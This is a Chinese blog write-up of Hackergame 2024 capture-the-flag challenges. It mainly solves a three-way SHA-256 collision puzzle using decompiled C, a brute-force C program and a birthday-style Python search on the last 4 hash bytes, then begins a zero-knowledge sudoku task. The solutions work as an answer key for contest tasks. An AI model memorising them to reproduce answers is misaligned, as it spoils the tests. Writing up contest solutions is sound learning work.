<p>作为一名密码学家，小 Z 一直为自己能轻松找出哈希碰撞而自豪。毕竟在密码学的江湖中，找到两个不同的字符串却产生相同的哈希值，这种本事可不是人人都有的。</p>
<p>但今天，小 Z 遇到了一个前所未有的挑战。</p>
<p>「找到两个碰撞就像找到双胞胎，」小 Z 自言自语，「可是现在，我需要找到三胞胎？！」</p>
<p>是的，在这个平行宇宙中，仅仅找到两个碰撞已经不够刺激了。作为一名合格的哈希碰撞猎人，你必须找到三个不同的字符串，它们在经过哈希计算后会产生相同的值。</p>
<p>「双胞胎在自然界尚且常见，三胞胎可就是凤毛麟角了。」小 Z 叹了口气。</p>
<p>你能帮助小 Z 找到这个传说中的三碰撞吗？</p>
<p>「在密码学的世界里，两个是巧合，三个才是艺术。」</p>
<blockquote>
<p>AI 辅助创作部分结束</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/USTC-Hackergame/hackergame2024-writeups/blob/master/official/%E5%93%88%E5%B8%8C%E4%B8%89%E7%A2%B0%E6%92%9E/files/hashcol3.zip">本题附件</a></p>
</div>
</div></details>
<h3 id="三碰撞之一"><a href="#三碰撞之一" class="headerlink" title="三碰撞之一"></a>三碰撞之一</h3><p>最后一个比赛日的晚上，看这题做的人比较多，我也来试试吧！</p>
<p>用ida打开此题的文件：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-F8h]</span>
  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-F4h]</span>
  <span class="token keyword">int</span> k<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-F0h]</span>
  <span class="token keyword">int</span> c<span class="token punctuation">;</span> <span class="token comment">// [rsp+14h] [rbp-ECh]</span>
  FILE <span class="token operator">*</span>stream<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-E8h]</span>
  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+24h] [rbp-DCh]</span>
  <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-D8h]</span>
  <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+2Ch] [rbp-D4h]</span>
  _QWORD v12<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-D0h] BYREF</span>
  <span class="token keyword">char</span> s1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-B0h] BYREF</span>
  <span class="token keyword">char</span> v14<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+61h] [rbp-9Fh] BYREF</span>
  <span class="token keyword">char</span> v15<span class="token punctuation">[</span><span class="token number">134</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+72h] [rbp-8Eh] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v16<span class="token punctuation">;</span> <span class="token comment">// [rsp+F8h] [rbp-8h]</span>
  __int64 savedregs<span class="token punctuation">;</span> <span class="token comment">// [rsp+100h] [rbp+0h] BYREF</span>

  v16 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Data %d:"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%16s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s1<span class="token punctuation">[</span><span class="token number">17</span> <span class="token operator">*</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span>
      <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">hex_to_bin</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">[</span><span class="token number">17</span> <span class="token operator">*</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token string">"Invalid input\n"</span><span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> <span class="token number">0xEuLL</span><span class="token punctuation">,</span> <span class="token constant">stderr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> v14<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> v15<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>v14<span class="token punctuation">,</span> v15<span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Input should be different"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">SHA256</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">8LL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v15<span class="token punctuation">[</span><span class="token number">32</span> <span class="token operator">*</span> j <span class="token operator">+</span> <span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v9 <span class="token operator">+</span> j<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span>
      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v9 <span class="token operator">+</span> j<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>savedregs <span class="token operator">+</span> <span class="token number">32</span> <span class="token operator">*</span> j <span class="token operator">+</span> k <span class="token operator">-</span> <span class="token number">84</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v9 <span class="token operator">+</span> j<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v9 <span class="token operator">==</span> v10 <span class="token operator">&amp;&amp;</span> v10 <span class="token operator">==</span> v11 <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    stream <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag1"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>stream <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token string">"Can't open file\n"</span><span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> <span class="token number">0x10uLL</span><span class="token punctuation">,</span> <span class="token constant">stderr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      c <span class="token operator">=</span> <span class="token function">fgetc</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> c <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token function">putchar</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">fclose</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Wrong answer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>但我不太熟悉C语言，这代码看的是真头大。好在一顿分析，我写出了等价的Python代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random
<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha256

hexes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'abcd1234efefcaca'</span><span class="token punctuation">,</span> <span class="token string">'deadbeefdeadbeef'</span><span class="token punctuation">,</span> <span class="token string">'123a4367deadbeef'</span><span class="token punctuation">]</span>

v12 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> hexes<span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span>
ans <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment"># v9 v10 v11</span>
v15 <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">)</span>  <span class="token comment"># -142 -> -8</span>

<span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    v15<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>sha256<span class="token punctuation">(</span>v12<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        ans<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> v15<span class="token punctuation">[</span><span class="token number">58</span> <span class="token operator">+</span> <span class="token number">32</span> <span class="token operator">*</span> j <span class="token operator">+</span> k<span class="token punctuation">]</span> <span class="token operator">|</span> <span class="token punctuation">(</span>ans<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>v15<span class="token punctuation">[</span><span class="token number">58</span> <span class="token operator">+</span> <span class="token number">32</span> <span class="token operator">*</span> j <span class="token operator">+</span> k<span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token operator">=</span><span class="token punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ans<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这样看就清晰多了，我们其实只要碰撞<code>sha256</code>的最后4个字节就行了，这平均也就只需要碰撞256 ** 4次，似乎是可接受的。</p>
<p>不过这如果用 Python 来写，估计得跑到猴年马月。于是我（在GPT的辅助下）写了个C程序：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;openssl/sha.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;time.h></span></span>

<span class="token keyword">void</span> <span class="token function">bytes_to_hex</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>bytes<span class="token punctuation">,</span> <span class="token class-name">size_t</span> len<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>hex_output<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">sprintf</span><span class="token punctuation">(</span>hex_output <span class="token operator">+</span> i <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"%02x"</span><span class="token punctuation">,</span> bytes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>a <span class="token operator">=</span> <span class="token string">"89629d7e0868d3d9"</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> ans<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token function">strncpy</span><span class="token punctuation">(</span>ans<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> a_bytes<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">sscanf</span><span class="token punctuation">(</span>a <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> i<span class="token punctuation">,</span> <span class="token string">"%2hhx"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>a_bytes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> h<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> hash<span class="token punctuation">[</span>SHA256_DIGEST_LENGTH<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">SHA256</span><span class="token punctuation">(</span>a_bytes<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> hash<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>h<span class="token punctuation">,</span> hash <span class="token operator">+</span> SHA256_DIGEST_LENGTH <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">int</span> found <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> attempts <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>found <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 生成8字节的随机数</span>
        <span class="token keyword">unsigned</span> <span class="token keyword">char</span> b<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">unsigned</span> <span class="token keyword">char</span> b_hash<span class="token punctuation">[</span>SHA256_DIGEST_LENGTH<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token function">SHA256</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> b_hash<span class="token punctuation">)</span><span class="token punctuation">;</span>

        attempts<span class="token operator">++</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>b_hash <span class="token operator">+</span> SHA256_DIGEST_LENGTH <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">,</span> h<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">bytes_to_hex</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> ans<span class="token punctuation">[</span>found<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Found match: %s\n"</span><span class="token punctuation">,</span> ans<span class="token punctuation">[</span>found<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            found<span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>attempts <span class="token operator">%</span> <span class="token number">1000000</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Total found: %d, Attempts so far: %llu\n"</span><span class="token punctuation">,</span> found<span class="token punctuation">,</span> attempts<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> ans<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>实测大约跑了90亿次以后，程序碰出了两个值：</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blogfiles.oss.fyz666.xyz/png/101d6739-c85b-413f-81a8-1175afd0f35a.png" alt="image-20241109195444240" style="zoom:50%"></p>
<hr>
<p>赛后看<a target="_blank" rel="noopener" href="https://mcfx.us/posts/2024-11-09-hackergame-2024-writeup/#%E4%B8%89%E7%A2%B0%E6%92%9E%E4%B9%8B%E4%B8%80">mcfx的题解</a>，才发现我之前考虑过的方法其实是work的：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha256
<span class="token keyword">from</span> collections <span class="token keyword">import</span> defaultdict
<span class="token keyword">import</span> os

d <span class="token operator">=</span> defaultdict<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
    s <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
    h <span class="token operator">=</span> sha256<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
    d<span class="token punctuation">[</span>h<span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>d<span class="token punctuation">[</span>h<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> v <span class="token keyword">in</span> d<span class="token punctuation">[</span>h<span class="token punctuation">]</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>v<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>但我当时错误的估计了碰撞难度，以为这样会把字典撑爆，故没有实施。后来试了一下发现这方法贼快，而我写C语言强行碰撞90亿次的行为则像个大冤种。</p>
<h2 id="零知识数独"><a href="#零知识数独" class="headerlink" title="零知识数独"></a>零知识数独</h2><details class="toggle"><summary class="toggle-button">查看题面</summary><div class="toggle-content"><div class="note primary simple"><p>一款全新的零知识数独！你已然是数独高手，也终将成为零知识证明大师！</p>
<blockquote>
<p>“If the proof is correct, then no other recognition is needed.”</p>
<p><cite>— by Grigori Perelman</cite></p>
</blockquote>
<p><strong>ZK 验证逻辑</strong></p>
<p>本题的附件中给出了零知识数独电路，以及对应的 Groth16 验证密钥，服务端会使用它保存的谜题（Public Signals）和验证密钥（Verification Key）来验证提交的 Groth16 证明 <code>proof.json</code>。你的证明在本地需要满足：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ snarkjs groth16 verify verification_key.json public.json proof.json
<span class="token punctuation">[</span>INFO<span class="token punctuation">]</span>  snarkJS: OK<span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><a target="_blank" rel="noopener" href="https://github.com/USTC-Hackergame/hackergame2024-writeups/blob/master/official/%E9%9B%B6%E7%9F%A5%E8%AF%86%E6%95%B0%E7%8B%AC/files/zksudoku.zip">本题附件</a></p>
</div>
</div></details>
<p>零知识证明？这个名词虽然听过，但也算是没接触过的东西，成功把我唬住了，没想到前两问就是送分。</p>
<h3 id="数独高手"><a href="#数独高手" class="headerlink" title="数独高手"></a>数独高手</h3><p>手玩所有难度即可拿flag。也可以借助<a target="_blank" rel="noopener" href="http://zh.sudoku.menu/info/solver.html">这个网站</a></p>
